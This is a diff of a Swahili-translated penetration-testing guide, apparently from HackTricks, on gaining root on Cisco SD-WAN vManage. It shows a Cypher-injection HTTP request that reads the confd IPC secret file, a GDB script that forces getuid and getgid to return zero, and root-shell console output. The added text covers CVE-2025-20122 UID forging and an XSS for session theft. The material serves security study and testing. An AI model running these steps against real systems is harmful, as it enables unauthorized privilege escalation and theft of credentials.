@@ -4,17 +4,17 @@
 
 ## Path 1
 
-(Esimu kutoka [https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html](https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html))
+(Mfano kutoka kwa [https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html](https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html))
 
-Baada ya kuchimba kidogo kupitia baadhi ya [nyaraka](http://66.218.245.39/doc/html/rn03re18.html) zinazohusiana na `confd` na binaries tofauti (zinazopatikana kwa akaunti kwenye tovuti ya Cisco), tuligundua kwamba ili kuthibitisha socket ya IPC, inatumia siri iliyoko katika `/etc/confd/confd_ipc_secret`:
+Baada ya kuchimba kidogo kupitia baadhi ya [documentation](http://66.218.245.39/doc/html/rn03re18.html) zinazohusiana na `confd` na binaries tofauti (zinazopatikana kwa akaunti kwenye tovuti ya Cisco), tuligundua kwamba ili kuthibitisha soketi ya IPC, inatumia siri iliyoko katika `/etc/confd/confd_ipc_secret`:
 ```
 vmanage:~$ ls -al /etc/confd/confd_ipc_secret
 
 -rw-r----- 1 vmanage vmanage 42 Mar 12 15:47 /etc/confd/confd_ipc_secret
 ```
-Kumbuka mfano wetu wa Neo4j? Inafanya kazi chini ya ruhusa za mtumiaji `vmanage`, hivyo inaturuhusu kupata faili hiyo kwa kutumia udhaifu wa awali:
+Kumbuka instance yetu ya Neo4j? Inafanya kazi chini ya ruhusa za mtumiaji `vmanage`, hivyo kutuwezesha kupata faili kwa kutumia udhaifu uliotangulia:
 ```
-GET /dataservice/group/devices?groupId=test\\\'<>\"test\\\\\")+RETURN+n+UNION+LOAD+CSV+FROM+\"file:///etc/confd/confd_ipc_secret\"+AS+n+RETURN+n+//+' HTTP/1.1
+GET /dataservice/group/devices?groupId=test\\\'<>\"test\\\\")+RETURN+n+UNION+LOAD+CSV+FROM+\"file:///etc/confd/confd_ipc_secret\"+AS+n+RETURN+n+//+' HTTP/1.1
 
 Host: vmanage-XXXXXX.viptela.net
 
@@ -24,7 +24,7 @@ Host: vmanage-XXXXXX.viptela.net
 
 "data":[{"n":["3708798204-3215954596-439621029-1529380576"]}]}
 ```
-Programu ya `confd_cli` haisaidii hoja za amri za mstari lakini inaita `/usr/bin/confd_cli_user` kwa hoja. Hivyo, tunaweza kuitisha moja kwa moja `/usr/bin/confd_cli_user` kwa seti zetu za hoja. Hata hivyo, haiwezi kusomwa na haki zetu za sasa, hivyo tunapaswa kuipata kutoka rootfs na kuikopi kwa kutumia scp, kusoma msaada, na kuitumia kupata shell:
+Programu ya `confd_cli` haiungi mkono vigezo vya command line lakini inaita `/usr/bin/confd_cli_user` na vigezo. Kwa hivyo, tunaweza kuita moja kwa moja `/usr/bin/confd_cli_user` na seti yetu ya vigezo. Hata hivyo, haiwezi kusomwa kwa vibali vyetu vya sasa, hivyo tunapaswa kuipata kutoka rootfs na kuikopisha kwa kutumia scp, kusoma help, na kuitumia kupata shell:
 ```
 vManage:~$ echo -n "3708798204-3215954596-439621029-1529380576" > /tmp/ipc_secret
 
@@ -42,14 +42,17 @@ vManage:~# id
 
 uid=0(root) gid=0(root) groups=0(root)
 ```
-## Path 2
+## Njia 2
 
-(Example from [https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77](https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77))
+(Mfano kutoka kwa [https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77](https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77))
 
-Blogu¹ ya timu ya synacktiv ilielezea njia ya kuvutia ya kupata root shell, lakini tatizo ni kwamba inahitaji kupata nakala ya `/usr/bin/confd_cli_user` ambayo inaweza kusomwa tu na root. Nilipata njia nyingine ya kupandisha hadhi hadi root bila usumbufu kama huo.
+Blogu¹ ya timu ya synacktiv ilieleza njia nzuri ya kupata root shell, lakini shida ni kwamba inahitaji kupata nakala ya `/usr/bin/confd_cli_user` ambayo inasomwa tu na root. Nilipata njia nyingine ya kupanda hadhi hadi root bila taabu hiyo.
 
-Nilipokata `/usr/bin/confd_cli` binary, niliona yafuatayo:
-```
+Nilipopasua binary ya `/usr/bin/confd_cli`, niliona yafuatayo:
+
+<details>
+<summary>Objdump showing UID/GID collection</summary>
+```asm
 vmanage:~$ objdump -d /usr/bin/confd_cli
 … snipped …
 40165c: 48 89 c3              mov    %rax,%rbx
@@ -77,20 +80,22 @@ vmanage:~$ objdump -d /usr/bin/confd_cli
 4016c4:   e8 d7 f7 ff ff           callq  400ea0 <*ABS*+0x32e9880f0b@plt>
 … snipped …
 ```
-Wakati ninapokimbia “ps aux”, niliona yafuatayo (_note -g 100 -u 107_)
+</details>
+
+Nilipokimbiza “ps aux”, niliona yafuatayo (_note -g 100 -u 107_)
 ```
 vmanage:~$ ps aux
 … snipped …
 root     28644  0.0  0.0   8364   652 ?        Ss   18:06   0:00 /usr/lib/confd/lib/core/confd/priv/cmdptywrapper -I 127.0.0.1 -p 4565 -i 1015 -H /home/neteng -N neteng -m 2232 -t xterm-256color -U 1358 -w 190 -h 43 -c /home/neteng -g 100 -u 1007 bash
 … snipped …
 ```
-Niliweka dhana kwamba programu ya “confd_cli” inapita kitambulisho cha mtumiaji na kitambulisho cha kundi ilichokusanya kutoka kwa mtumiaji aliyeingia kwenye programu ya “cmdptywrapper”.
+Nilihukumu kwamba programu "confd_cli" inapitisha user ID na group ID ilizokusanya kutoka kwa mtumiaji aliyeingia kwa programu "cmdptywrapper".
 
-Jaribio langu la kwanza lilikuwa kuendesha “cmdptywrapper” moja kwa moja na kuipatia `-g 0 -u 0`, lakini lilishindwa. Inaonekana kuwa descriptor ya faili (-i 1015) iliundwa mahali fulani kwenye mchakato na siwezi kuigiza.
+Jaribio langu la kwanza lilikuwa kuendesha "cmdptywrapper" moja kwa moja na kumpa `-g 0 -u 0`, lakini lilikosea. Inaonekana file descriptor (-i 1015) iliumbwa mahali fulani njiani na siwezi kuiga.
 
-Kama ilivyotajwa kwenye blogu ya synacktiv (mfano wa mwisho), programu ya `confd_cli` haisaidii hoja za mstari wa amri, lakini naweza kuathiri hiyo kwa kutumia debugger na kwa bahati GDB imejumuishwa kwenye mfumo.
+Kama ilivyoelezwa kwenye blogi ya synacktiv (mfano wa mwisho), programu `confd_cli` haisaidii command line arguments, lakini ninaweza kuibadilisha kwa debugger na kwa bahati GDB imejumuishwa kwenye mfumo.
 
-Nilitengeneza skripti ya GDB ambapo nililazimisha API `getuid` na `getgid` kurudisha 0. Kwa kuwa tayari nina ruhusa ya “vmanage” kupitia RCE ya deserialization, nina ruhusa ya kusoma `/etc/confd/confd_ipc_secret` moja kwa moja.
+Nilitengeneza script ya GDB ambapo nililazimisha API `getuid` na `getgid` zirudishe 0. Kwa kuwa tayari nina ruhusa ya "vmanage" kupitia deserialization RCE, nina idhini ya kusoma `/etc/confd/confd_ipc_secret` moja kwa moja.
 
 root.gdb:
 ```
@@ -110,8 +115,11 @@ root
 end
 run
 ```
-Matokeo ya Kihesabu:
-```
+Matokeo ya konsoli:
+
+<details>
+<summary>Matokeo ya konsoli</summary>
+```text
 vmanage:/tmp$ gdb -x root.gdb /usr/bin/confd_cli
 GNU gdb (GDB) 8.0.1
 Copyright (C) 2017 Free Software Foundation, Inc.
@@ -144,4 +152,25 @@ root
 uid=0(root) gid=0(root) groups=0(root)
 bash-4.4#
 ```
+</details>
+
+## Njia 3 (hitilafu ya uthibitishaji wa pembejeo ya CLI ya 2025)
+
+Cisco renamed vManage to *Catalyst SD-WAN Manager*, lakini CLI ya chini bado inaendesha kwenye sanduku lile lile. Ufafanuzi wa 2025 (CVE-2025-20122) unaelezea ukosefu wa uthibitishaji wa pembejeo kwenye CLI unaoruhusu **mtumiaji yeyote wa ndani aliyethibitishwa** kupata root kwa kutuma ombi lililotengenezwa kwa huduma ya manager CLI. Unganisha kificho chochote cha upatikanaji wa kibali cha chini (mfano, Neo4j deserialization kutoka Path1, au shell ya mtumiaji wa cron/backup) na hitilafu hii ili kuruka kuwa root bila kunakili `confd_cli_user` au kuambatanisha GDB:
+
+1. Tumia shell yako ya kibali cha chini kutafuta endpoint ya CLI IPC (kawaida listener ya `cmdptywrapper` inayoonekana kwenye port 4565 katika Path2).
+2. Tengeneza ombi la CLI linaloforge sehemu za UID/GID kuwa 0. mdudu wa uthibitishaji unashindwa kutekeleza UID ya mwito asilia, hivyo wrapper inaanzisha PTY yenye msaada wa root.
+3. Pipe mfululizo wowote wa maagizo (`vshell; id`) kupitia ombi lililotengenezwa kupata shell ya root.
+
+> The exploit surface is local-only; remote code execution is still required to land the initial shell, but once inside the box exploitation is a single IPC message rather than a debugger-based UID patch.
+
+## Other recent vManage/Catalyst SD-WAN Manager vulns to chain
+
+* **Authenticated UI XSS (CVE-2024-20475)** – Inject JavaScript in specific interface fields; stealing an admin session gives you a browser-driven path to `vshell` → local shell → Path3 for root.
+
+## References
+
+- [Cisco Catalyst SD-WAN Manager Privilege Escalation Vulnerability (CVE-2025-20122)](https://www.cisco.com/c/en/us/support/docs/csa/cisco-sa-sdwan-priviesc-WCk7bmmt.html)
+- [Cisco Catalyst SD-WAN Manager Cross-Site Scripting Vulnerability (CVE-2024-20475)](https://www.cisco.com/c/en/us/support/docs/csa/cisco-sa-sdwan-xss-zQ4KPvYd.html)
+
 {{#include ../../banners/hacktricks-training.md}}
